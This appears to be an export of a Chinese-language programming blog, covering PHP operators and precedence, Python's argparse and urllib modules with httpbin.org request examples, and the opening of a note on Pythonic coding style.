<td align="center"><code>$x += 3</code>  等同于 <code>$x = $x + 3</code></td>
</tr>
<tr>
<td align="center">-=</td>
<td align="center">减法赋值运算符</td>
<td align="center"><code>$x -= 3</code>  等同于 <code>$x = $x - 3</code></td>
</tr>
<tr>
<td align="center">*=</td>
<td align="center">乘法赋值运算符</td>
<td align="center"><code>$x *= 3</code>  等同于 <code>$x = $x * 3</code></td>
</tr>
<tr>
<td align="center">/=</td>
<td align="center">除法赋值运算符</td>
<td align="center"><code>$x /= 3</code>  等同于 <code>$x = $x / 3</code></td>
</tr>
<tr>
<td align="center">%=</td>
<td align="center">取余赋值运算符</td>
<td align="center"><code>$x %= 3</code>  等同于 <code>$x = $x % 3</code></td>
</tr>
<tr>
<td align="center">**=</td>
<td align="center">幂赋值运算符</td>
<td align="center"><code>$x **= 3</code>  等同于 <code>$x = $x ** 3</code></td>
</tr>
<tr>
<td align="center">&amp;=</td>
<td align="center">与赋值运算符</td>
<td align="center">比较两个值的二进制，两个值都为1，则该位结果为1，否则为0</td>
</tr>
<tr>
<td align="center">|=</td>
<td align="center">或赋值运算符</td>
<td align="center">比较两个值的二进制，对应的位有一个为1时，结果为1</td>
</tr>
<tr>
<td align="center">^=</td>
<td align="center">异或赋值运算符</td>
<td align="center">异或运算符，比较两个值的二进制，对应的位相异时，结果为1</td>
</tr>
<tr>
<td align="center">&lt;&lt;=</td>
<td align="center">左移赋值运算符</td>
<td align="center">把左边数值的各二进制位全部左移若干位，右边的数指定移动的位数</td>
</tr>
<tr>
<td align="center">&gt;&gt;=</td>
<td align="center">右移赋值运算符</td>
<td align="center">把左边数值的各二进制位全部右移若干位，右边的数指定移动的位数</td>
</tr>
<tr>
<td align="center">.=</td>
<td align="center">并置赋值运算符</td>
<td align="center">字符串拼接</td>
</tr>
<tr>
<td align="center">??=</td>
<td align="center">NULL合并赋值运算符</td>
<td align="center">NULL合并</td>
</tr>
</tbody></table>
<p>PHP 支持引用赋值，引用赋值意味着两个变量指向了同一个数据，没有拷贝任何东西</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">3</span>;</span><br><span class="line"><span class="variable">$b</span> = &amp;<span class="variable">$a</span>;</span><br><span class="line"><span class="comment"># 这里 $b 是 $a 的引用</span></span><br><span class="line"><span class="comment"># 如果修改 $a 的值, $b 的值也会被改变</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><p>如果关系成立 ，返回True，否则返回False</p>
<table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">描述</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">==</td>
<td align="center">等于</td>
<td align="center">在类型转换后，比较双方的值是否相等</td>
</tr>
<tr>
<td align="center">===</td>
<td align="center">全等</td>
<td align="center">比较双方的类型和值是否相等</td>
</tr>
<tr>
<td align="center">!=</td>
<td align="center">不等</td>
<td align="center">在类型转换后，比较双方的值是否不相等</td>
</tr>
<tr>
<td align="center">&lt;&gt;</td>
<td align="center">不等</td>
<td align="center">在类型转换后，比较双方的值是否不相等</td>
</tr>
<tr>
<td align="center">!==</td>
<td align="center">不全等</td>
<td align="center">比较双方的类型和值是否不相等</td>
</tr>
<tr>
<td align="center">&lt;</td>
<td align="center">小于</td>
<td align="center">比较左边的值是否小于右边</td>
</tr>
<tr>
<td align="center">&gt;</td>
<td align="center">大于</td>
<td align="center">比较左边的值是否大于右边</td>
</tr>
<tr>
<td align="center">&lt;=</td>
<td align="center">小于等于</td>
<td align="center">比较左边的值是否小于右边，或者等于右边</td>
</tr>
<tr>
<td align="center">&gt;=</td>
<td align="center">大于等于</td>
<td align="center">比较左边的值是否大于右边，或者等于右边</td>
</tr>
<tr>
<td align="center">&lt;=&gt;</td>
<td align="center">太空船运算符（组合比较符）</td>
<td align="center">同时比较左边的值是否小于，等于，大于右边，返回int值-1,0,1</td>
</tr>
<tr>
<td align="center">??</td>
<td align="center">NULL合并运算符</td>
<td align="center">当左边为null，返回右边的值，否则返回左边的值</td>
</tr>
</tbody></table>
<h3 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h3><table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">描述</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>$a</code>?<code>$b</code>:<code>$c</code></td>
<td align="center">三元运算符</td>
<td align="center">通过条件判断来返回不同的值</td>
</tr>
</tbody></table>
<p>对于三元运算符<code>$a</code>?<code>$b</code>:<code>$c</code></p>
<p>如果表达式<code>$a</code>的值为true时，返回<code>$b</code></p>
<p>如果表达式<code>$a</code>的值为flase时，返回<code>$c</code></p>
<p>此运算符也可以简写成<code>$a</code>?:<code>$c</code></p>
<p>如果表达式<code>$a</code>的值为true时，返回<code>$a</code></p>
<p>如果表达式<code>$a</code>的值为flase时，返回<code>$c</code></p>
<h3 id="递增-递减运算符"><a href="#递增-递减运算符" class="headerlink" title="递增/递减运算符"></a>递增/递减运算符</h3><table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">描述</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">++$a</td>
<td align="center">前置递增</td>
<td align="center"><code>$a</code> 的值加一，然后返回 <code>$a</code></td>
</tr>
<tr>
<td align="center">$a++</td>
<td align="center">后置递增</td>
<td align="center">返回 <code>$a</code>，然后将 <code>$a</code>的值加一</td>
</tr>
<tr>
<td align="center">–$a</td>
<td align="center">前置递减</td>
<td align="center"><code>$a</code>的值减一，然后返回 <code>$a</code></td>
</tr>
<tr>
<td align="center">$a–</td>
<td align="center">后置递减</td>
<td align="center">返回 <code>$a</code>，然后将 <code>$a</code>的值减一</td>
</tr>
</tbody></table>
<p>在运算符处理字符变量时，PHP会使用 Perl 的习惯，而非 C 的</p>
<p>在 Perl 中 <code>$a = &#39;Z&#39;;$a++;</code>，将会把<code>$a</code>变成<code>AA</code></p>
<p>而在 C 中<code>$a = &#39;Z&#39;;$a++;</code>，将会把<code>$a</code>变成<code>[</code>（<code>Z</code> 的 ASCII 值是90，<code>[</code> 的 ASCII 值是91）</p>
<p>注意字符变量只能递增，不能递减，并且只支持纯字母（a-z和A-Z）</p>
<p>在上述范围内的其他字符变量，递增或者递减无效，原字符串没有变化</p>
<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">描述</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">and</td>
<td align="center">逻辑与</td>
<td align="center">如果两边都为true，则返回true</td>
</tr>
<tr>
<td align="center">or</td>
<td align="center">逻辑或</td>
<td align="center">如果至少有一个为true，则返回true</td>
</tr>
<tr>
<td align="center">xor</td>
<td align="center">逻辑异或</td>
<td align="center">如果仅有一个为true，则返回true</td>
</tr>
<tr>
<td align="center">&amp;&amp;</td>
<td align="center">逻辑与</td>
<td align="center">如果两边都为true，则返回true</td>
</tr>
<tr>
<td align="center">||</td>
<td align="center">逻辑或</td>
<td align="center">如果至少有一个为true，则返回true</td>
</tr>
<tr>
<td align="center">!</td>
<td align="center">逻辑非</td>
<td align="center">如果变量不为true，则返回true</td>
</tr>
</tbody></table>
<h3 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h3><p>位移在PHP中是数学运算，向任何方向移出去的位都会被丢弃</p>
<p>左移时，右侧以零补充，若符号位被移走意味着正负号不被保留</p>
<p>右移时，右侧移出去的位被丢弃，左侧则以符号位填充</p>
<p>数值表现为32位</p>
<table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">描述</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&amp;</td>
<td align="center">按位与</td>
<td align="center">将两边的二进制，将都是1的位设为1，否则为0</td>
</tr>
<tr>
<td align="center">|</td>
<td align="center">按位或</td>
<td align="center">将两边的二进制，任何为1的位设为1，否则为0</td>
</tr>
<tr>
<td align="center">^</td>
<td align="center">按位异或</td>
<td align="center">将两边的二进制，其中一边为1，另一边为0的位设为1，否则为0</td>
</tr>
<tr>
<td align="center">~</td>
<td align="center">按位取反</td>
<td align="center">将变量中为1的位设为0，为0的位设为1</td>
</tr>
<tr>
<td align="center">&lt;&lt;</td>
<td align="center">左移</td>
<td align="center">将左边<code>$a</code>的位向左移动<code>$b</code>次（每次移动表示乘以2）</td>
</tr>
<tr>
<td align="center">&gt;&gt;</td>
<td align="center">右移</td>
<td align="center">将左边<code>$a</code>的位向右移动<code>$b</code>次（每次移动表示除以2）</td>
</tr>
</tbody></table>
<h3 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h3><table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">描述</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">.</td>
<td align="center">并置运算符（连接字符串）</td>
<td align="center">‘hello’.‘123’ = ‘hello123’</td>
</tr>
</tbody></table>
<h3 id="数组运算符"><a href="#数组运算符" class="headerlink" title="数组运算符"></a>数组运算符</h3><p>当数据类型为数组时，前面的一些运算符，在这里为数组运算符</p>
<p>当两个数组中存在相同的键名，则只有左边数组中的，右边的被忽略</p>
<p>数组中如果具有相同的键名，则比较值</p>
<table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">描述</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">+</td>
<td align="center">集合</td>
<td align="center">两边的集合</td>
</tr>
<tr>
<td align="center">==</td>
<td align="center">相等</td>
<td align="center">如果两边具有相同的键值对，则为true</td>
</tr>
<tr>
<td align="center">===</td>
<td align="center">全等</td>
<td align="center">如果两边具有相同的键值对，并且顺序和类型都相同，则为true</td>
</tr>
<tr>
<td align="center">!=</td>
<td align="center">不等</td>
<td align="center">如果两边不相等，则为true</td>
</tr>
<tr>
<td align="center">&lt;&gt;</td>
<td align="center">不等</td>
<td align="center">如果两边不相等，则为true</td>
</tr>
<tr>
<td align="center">!==</td>
<td align="center">不全等</td>
<td align="center">如果两百的键值对，并且顺序和类型都不同，则为true</td>
</tr>
</tbody></table>
<h3 id="类型运算符"><a href="#类型运算符" class="headerlink" title="类型运算符"></a>类型运算符</h3><table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">描述</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">instanceof</td>
<td align="center">类型运算符</td>
<td align="center">确定变量是否是某一类的实例</td>
</tr>
</tbody></table>
<p><code>instanceof</code> 用于确定一个PHP变量是否属于某一类<code>Class</code>的实例</p>
<p>除了类，也可以使用对象或者字符串变量</p>
<p>如果变量不是对象，则返回false</p>
<p>也可以用来确定一个变量是不是继承自某一个父类的子类的实例</p>
<p>也可以使用逻辑非运算符达到检查对象是否是某个类的实例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myclass</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">notmyclass</span></span>&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> myclass;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$a</span> <span class="keyword">instanceof</span> myclass);</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">true</span>)</span><br><span class="line">    </span><br><span class="line">var_dump(<span class="variable">$a</span> <span class="keyword">instanceof</span> notmyclass);</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure>



<h3 id="执行运算符"><a href="#执行运算符" class="headerlink" title="执行运算符"></a>执行运算符</h3><p>PHP支持执行运算符：反引号（``），不是单引号，位于左侧TAB键位的上边</p>
<p>PHP讲尝试反引号中的内容作为shell命令来执行，并将其输出信息返回（赋值给变量而不是丢弃到标准输出）</p>
<p>使用反引号运算符的效果与函数<code>shell_exec()</code>相同</p>
<p>关闭了<code>shell_exec()</code>时反引号运算符是无效的</p>
<p>反引号运算符不能在双引号字符串中使用</p>
<table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">描述</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">反引号（``）</td>
<td align="center">执行运算符</td>
<td align="center">执行shell命令</td>
</tr>
</tbody></table>
<h3 id="错误控制运算符"><a href="#错误控制运算符" class="headerlink" title="错误控制运算符"></a>错误控制运算符</h3><p>@运算符，把该运算符放在表达式之前，该表达式可能产生的任何错误信息都会被忽略掉</p>
<p>如果使用了自定义错误信息，则可能返回0</p>
<p>该运算符只对表达式有效，例如，可以把它放在变量，函数和include调用，常量等等</p>
<p>不能放在函数或者类的定义之前，也不能用于条件结构语句例如if和foreach等</p>
<p>该运算符也有导致一些脚本的错误报告失效，可能导致脚本的卡死</p>
<table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">描述</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">@</td>
<td align="center">错误控制运算符</td>
<td align="center">忽略表达式可能产生的任何错误信息</td>
</tr>
</tbody></table>
<h2 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h2><p>通过运算符的优先级来表示计算顺序</p>
<p>同一行中的运算符具有相同的优先级，结合方向决定了求值顺序</p>
<p>左：从左到右，右：从右到左</p>
<p>例如 1-2-3，如果是左联，就是 <code>(1-2)-3</code>，如果是右联,就是<code>1-(2-3)</code></p>
<p>在特殊情况下，可以使用括号标明运算顺序，来增加代码的可读性</p>
<table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">描述</th>
<th align="center">结合方向</th>
</tr>
</thead>
<tbody><tr>
<td align="center">clone，new</td>
<td align="center">clone和new</td>
<td align="center">不适用</td>
</tr>
<tr>
<td align="center">**</td>
<td align="center">算术运算符</td>
<td align="center">右</td>
</tr>
<tr>
<td align="center">++，–，~，(int)，(float)，(string)，(array)，(object)，(bool)，@</td>
<td align="center">类型，位，递增递减</td>
<td align="center">不适用</td>
</tr>
<tr>
<td align="center">instanceof</td>
<td align="center">类型运算符</td>
<td align="center">左</td>
</tr>
<tr>
<td align="center">!</td>
<td align="center">逻辑运算符</td>
<td align="center">不适用</td>
</tr>
<tr>
<td align="center">*，/，%</td>
<td align="center">算术运算符</td>
<td align="center">左</td>
</tr>
<tr>
<td align="center">+，-，.</td>
<td align="center">算术和字符串运算符</td>
<td align="center">左</td>
</tr>
<tr>
<td align="center">&lt;&lt;，&gt;&gt;</td>
<td align="center">位运算符</td>
<td align="center">左</td>
</tr>
<tr>
<td align="center">&lt;，&lt;=，&gt;，&gt;=</td>
<td align="center">比较运算符</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">==，!=，<code>===</code>，<code>!==</code>，&lt;&gt;，&lt;=&gt;</td>
<td align="center">比较运算符</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">&amp;</td>
<td align="center">位运算符和引用</td>
<td align="center">左</td>
</tr>
<tr>
<td align="center">^</td>
<td align="center">位运算符</td>
<td align="center">左</td>
</tr>
<tr>
<td align="center">|</td>
<td align="center">位运算符</td>
<td align="center">左</td>
</tr>
<tr>
<td align="center">&amp;&amp;</td>
<td align="center">逻辑运算符</td>
<td align="center">左</td>
</tr>
<tr>
<td align="center">||</td>
<td align="center">逻辑运算符</td>
<td align="center">左</td>
</tr>
<tr>
<td align="center">??</td>
<td align="center">null合并运算符</td>
<td align="center">右</td>
</tr>
<tr>
<td align="center">?:</td>
<td align="center">三元运算符</td>
<td align="center">左</td>
</tr>
<tr>
<td align="center">=，+=，-=，*=，/=，%=，**=，&amp;=，|=，^=，&lt;&lt;=，&gt;&gt;=，.==，??=</td>
<td align="center">赋值运算符</td>
<td align="center">右</td>
</tr>
<tr>
<td align="center">yield from</td>
<td align="center">yield from</td>
<td align="center">不适用</td>
</tr>
<tr>
<td align="center">yield</td>
<td align="center">yield</td>
<td align="center">不适用</td>
</tr>
<tr>
<td align="center">print</td>
<td align="center">print</td>
<td align="center">不适用</td>
</tr>
<tr>
<td align="center">and</td>
<td align="center">逻辑运算符</td>
<td align="center">左</td>
</tr>
<tr>
<td align="center">xor</td>
<td align="center">逻辑运算符</td>
<td align="center">左</td>
</tr>
<tr>
<td align="center">or</td>
<td align="center">逻辑运算符</td>
<td align="center">左</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>PHP</category>
        <category>PHP基础</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-argparse</title>
    <url>//1737262da5ee.html</url>
    <content><![CDATA[<h2 id="Argparse"><a href="#Argparse" class="headerlink" title="Argparse"></a>Argparse</h2><p>用于解析命令行参数和选项</p>
<h3 id="ArgumentParser"><a href="#ArgumentParser" class="headerlink" title="ArgumentParser"></a>ArgumentParser</h3><p>作为解析器，用来包含将命令行解析成Python数据类型的全部信息</p>
<p>语法：</p>
<p><strong>argparse.ArgumentParser(prog=None, usage=None, description=None, epilog=None, parents=[], formatter_class=argparse.HelpFormatter, prefix_chars=’-‘, fromfile_prefix_chars=None, argument_default=None, conflict_handler=’error’, add_help=True, allow_abbrev=True, exit_on_error=True)</strong></p>
<p><strong>prog</strong>: 程序的名称，默认为<code>sys.argv[0]</code></p>
<p><strong>usage</strong>: 描述程序用途的字符串（默认值：从添加到解析器的参数生成）</p>
<p><strong>description</strong>: 在参数帮助文档之前显示的文本（默认值：None）</p>
<p><strong>epilog</strong>: 在参数帮助文档之后显示的文本（默认值：None）</p>
<p><strong>parents</strong>: 一个<code>ArgumentParser</code>对象的列表，他们的参数也包含在内</p>
<p><strong>formatter_class</strong>: 用于自定义帮助文档输出格式的类</p>
<p><strong>prefix_chars</strong>: 可选参数的前缀字符集合（默认值：’ - ‘ ）</p>
<p><strong>fromfile_prefix_chars</strong>: 当需要从文件中读取其他参数时，用于标识文件名的前缀字符集合（默认值：None）</p>
<p><strong>argument_default</strong>: 参数的全局默认值（默认值： None）</p>
<p><strong>conflict_handler</strong>: 解决冲突选项的策略（通常是不必要的）</p>
<p><strong>add_help</strong>: 为解析器添加一个 -h/–help 选项（默认值： True）</p>
<p><strong>allow_abbrev</strong>: 如果缩写是无歧义的，则允许缩写长选项 （默认值：True）</p>
<p><strong>exit_on_error</strong>: 决定当错误发生时是否让 <code>ArgumentParser</code> 附带错误信息退出。 (默认值: True)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">parser = argparse.ArgumentParser(epilog=<span class="string">&#x27;\tExample: \r\npython3 &#x27;</span>+sys.argv[<span class="number">0</span>]+<span class="string">&quot; -u http://baidu.com&quot;</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python3</category>
        <category>Python3模块</category>
      </categories>
      <tags>
        <tag>Python3模块</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-urllib</title>
    <url>//3e40412aecd2.html</url>
    <content><![CDATA[<h1 id="urllib库"><a href="#urllib库" class="headerlink" title="urllib库"></a>urllib库</h1><p>urllib是Python自带模块，通过该模块可以实现HTTP网络请求</p>
<h2 id="urllib-request"><a href="#urllib-request" class="headerlink" title="urllib.request"></a>urllib.request</h2><p><code>urllib.request</code>子模块定义了请求HTTP的方法和类</p>
<h3 id="urlopen"><a href="#urlopen" class="headerlink" title="urlopen"></a>urlopen</h3><p><code>urllib.request.urlope()</code>参数用于对目标<code>URL</code>的访问</p>
<p>语法：</p>
<p><strong>urllib.request.urlopen(url, data=None, [timeout, ]*, cafile=None, capath=None, cadefault=False, context=None)</strong></p>
<ul>
<li><p><strong>url</strong>: 目标资源在网络中的位置，可以是一个表示URL的字符串，也可以是一个<code>urllib.request</code>对象</p>
</li>
<li><p><strong>data</strong>: 用来指明发送服务器请求中的额外的参数信息，data默认是<code>None</code>,当给出<code>data</code>参数时,传参变成<code>POST</code></p>
</li>
<li><p><code>data</code>必须是<code>bytes</code>（字节流）类型，如果是字典，可以用<code>urllib.parse</code>模块里的<code>urlencode()</code>编码</p>
</li>
<li><p><strong>timeout</strong>: 设置网站的访问超时时间，仅适用于HTTP，HTTPS和FTP连接</p>
</li>
<li><p><strong>context</strong>: 实现SSL加密传输，必须是<code>ssl.SSLContext</code>类型</p>
</li>
<li><p><strong>cafile</strong>: 指定CA证书</p>
</li>
<li><p><strong>capath</strong>: 指定CA证书的路径</p>
</li>
<li><p><strong>cadefault</strong>: 已经废弃，默认为<code>False</code></p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://httpbin.org/post&#x27;</span></span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="number">1</span>:<span class="string">&#x27;A&#x27;</span>&#125;</span><br><span class="line">data = <span class="built_in">bytes</span>(urllib.parse.urlencode(<span class="built_in">dict</span>),encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">response = urllib.request.urlopen(url,data=data,timeout=<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>



<h3 id="request"><a href="#request" class="headerlink" title="request"></a>request</h3><p><code>urllib.request.Request</code>用于构建一个请求</p>
<p>语法：</p>
<p><strong>urllib.request.Request(url, data=None, headers={}, origin_req_host=None, unverifiable=False, method=None)</strong></p>
<ul>
<li><p><strong>url</strong>: 目标资源在网络中的位置，可以是一个表示URL的字符串，也可以是一个<code>urllib.request</code>对象</p>
</li>
<li><p><strong>data</strong>: 用来指明发送服务器请求中的额外的参数信息，data默认是<code>None</code>,<code>data</code>必须是<code>bytes</code>（字节流）类型，如果是字典，可以用<code>urllib.parse</code>模块里的<code>urlencode()</code>编码</p>
</li>
<li><p><strong>headers</strong>: 用来构造请求头，也可以通过请求实例的<code>add_header()</code>方法添加</p>
</li>
<li><p><strong>method</strong>: 指定请求使用的方法</p>
</li>
<li><p><strong>origin_req_host</strong>: 指定请求方的host名称或者是IP地址</p>
</li>
<li><p><strong>unverifiable</strong>: 设置网页是否需要验证，默认是<code>False</code></p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://httpbin.org/post&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;httpbin.org&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="number">1</span>:<span class="string">&#x27;A&#x27;</span>&#125;</span><br><span class="line">data = <span class="built_in">bytes</span>(urllib.parse.urlencode(<span class="built_in">dict</span>),encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">req = urllib.request.Request(url=url,data=data,headers=headers,method=<span class="string">&#x27;POST&#x27;</span>)</span><br><span class="line"><span class="comment"># 这里也可以使用 add_header 添加headers</span></span><br><span class="line"><span class="comment"># req = urllib.request.Request(url=url,data=data,method=&#x27;POST&#x27;)</span></span><br><span class="line"><span class="comment"># req.add_header(&#x27;User-Agent&#x27;,&#x27;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&#x27;)</span></span><br><span class="line"><span class="comment"># req.add_header(&#x27;Host&#x27;,&#x27;httpbin.org&#x27;)</span></span><br><span class="line">response = urllib.request.urlopen(req)</span><br><span class="line"><span class="built_in">print</span>(response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>



<h3 id="BaseHandler"><a href="#BaseHandler" class="headerlink" title="BaseHandler"></a>BaseHandler</h3><p><code>urllib.request.BaseHandler</code>用来构造Request的一些高级特性</p>
<h2 id="urllib-response"><a href="#urllib-response" class="headerlink" title="urllib.response"></a>urllib.response</h2><p><code>urllib.response</code>子模块定义了返回HTTP的方法和类</p>
<p>urlopen返回对象提供方法：</p>
<p>read() , readline() ,readlines() , fileno() , close() ：对HTTPResponse类型数据进行操作</p>
<p>info()：返回HTTPMessage对象，表示远程服务器返回的头信息</p>
<p>getcode()：返回Http状态码。如果是http请求，200请求成功完成;404网址未找到</p>
<p>geturl()：返回请求的url</p>
<h2 id="urllib-parse"><a href="#urllib-parse" class="headerlink" title="urllib.parse"></a>urllib.parse</h2><p><code>urllib.parse</code>该子模块用于解析URL和引用URL</p>
<h3 id="urlparse"><a href="#urlparse" class="headerlink" title="urlparse"></a>urlparse</h3><p><code>urllib.parse.urlparse</code>用于解析UR</p>
<p>语法：</p>
<p><strong>urllib.parse.urlparse(urlstring, scheme=’’, allow_fragments=True)</strong></p>
<ul>
<li><strong>urlstring</strong>: 表示字符串的url地址</li>
<li><strong>scheme</strong>: 表示协议类型</li>
<li><strong>allow_fragments</strong>: 默认为<code>True</code>，如果为<code>False</code>则无法识别片段标识符，返回<code>fragment=&#39;&#39;</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;http://python.org/学习/index?a=1&#x27;</span></span><br><span class="line">Result = urllib.parse.urlparse(key)</span><br><span class="line"><span class="built_in">print</span>(Result)</span><br><span class="line"></span><br><span class="line">ParseResult(scheme=<span class="string">&#x27;http&#x27;</span>, netloc=<span class="string">&#x27;python.org&#x27;</span>, path=<span class="string">&#x27;/学习/index&#x27;</span>, params=<span class="string">&#x27;&#x27;</span>, query=<span class="string">&#x27;a=1&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># 其中scheme是协议，netloc是域名，path是路径，params是参数，query是查询的条件，fragment是片段</span></span><br><span class="line"><span class="comment"># 也可以单独输出</span></span><br><span class="line"><span class="built_in">print</span>(Result.scheme)</span><br></pre></td></tr></table></figure>



<h3 id="quote"><a href="#quote" class="headerlink" title="quote"></a>quote</h3><p>对URL进行编码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">&#x27;http://python.org/学习&#x27;</span></span><br><span class="line">key1 = urllib.parse.quote(key)</span><br><span class="line"><span class="built_in">print</span>(key1)</span><br><span class="line"></span><br><span class="line">http%3A//python.org/%E5%AD%A6%E4%B9%A0</span><br></pre></td></tr></table></figure>



<h3 id="unquote"><a href="#unquote" class="headerlink" title="unquote"></a>unquote</h3><p>对URL进行解码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">&#x27;http://python.org/学习&#x27;</span></span><br><span class="line">key1 = urllib.parse.quote(key)</span><br><span class="line">key2 = urllib.parse.unquote(key1)</span><br><span class="line"><span class="built_in">print</span>(key2)</span><br><span class="line"></span><br><span class="line">http://python.org/学习</span><br></pre></td></tr></table></figure>



<h2 id="urllib-robotparser"><a href="#urllib-robotparser" class="headerlink" title="urllib.robotparser"></a>urllib.robotparser</h2><p><code>urllib.robotparser</code>该子模块用于解析<code>robots.txt</code>文件</p>
<h2 id="urllib-error"><a href="#urllib-error" class="headerlink" title="urllib.error"></a>urllib.error</h2><p><code>urllib.error</code>该子模块包含了有关HTTP异常的类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">    urllib.request.urlopen(url)</span><br><span class="line">except urllib.error.URLError as e:</span><br><span class="line">    print(e.reason)</span><br><span class="line">    print(e.status)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python3</category>
        <category>Python3模块</category>
      </categories>
      <tags>
        <tag>Python3模块</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-代码优化</title>
    <url>//480c8f23ff14.html</url>
    <content><![CDATA[<p>Python 由于语言的简洁性，让我们以人类的思考方式来写代码</p>
<p><code>Pythonic</code>（优雅的，地道的，整洁的代码）</p>
<h2 id="变量交换"><a href="#变量交换" class="headerlink" title="变量交换"></a>变量交换</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">Bad</button></li><li class="tab"><button type="button" data-href="#-2">Pythonic</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tmp = a</span><br><span class="line">a = b</span><br><span class="line">b = tmp</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a,b = b,a</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>

